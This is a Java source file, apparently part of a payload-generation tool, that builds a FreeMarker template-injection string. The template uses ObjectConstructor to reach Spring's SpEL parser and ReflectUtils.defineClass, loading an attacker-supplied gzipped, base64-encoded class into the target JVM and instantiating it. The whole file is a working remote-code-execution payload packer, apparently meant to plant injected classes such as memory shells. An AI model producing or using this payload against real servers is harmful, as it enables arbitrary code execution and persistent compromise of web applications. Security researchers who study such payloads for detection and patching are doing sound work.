package com.reajason.javaweb.packer.freemarker;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.Packers;

import static com.reajason.javaweb.packer.spel.SpELSpringGzipJDK17Packer.assertClassNameValid;

/**
 * JDK 17-compatible FreeMarker/SpEL class-definition payload.
 *
 * @author ReaJason
 * @since 2026/8/30
 */
public class FreemarkerSpELSpringGzipJDK17Packer implements Packer {
    String template = "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"T(org.springframework.cglib.core.ReflectUtils).defineClass('{{className}}',T(org.springframework.util.StreamUtils).copyToByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(T(java.util.Base64).getDecoder().decode('{{base64Str}}')))),new java.net.URLClassLoader(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader()),null,T(java.lang.Class).forName('org.springframework.expression.ExpressionParser')).newInstance()\").getValue()}";

    @Override
    public String pack(ClassPackerConfig config) {
        String className = config.getClassName();
        assertClassNameValid(className);
        return template.replace("{{className}}", className)
                .replace("{{base64Str}}", Packers.GzipBase64.getInstance().pack(config));
    }
}
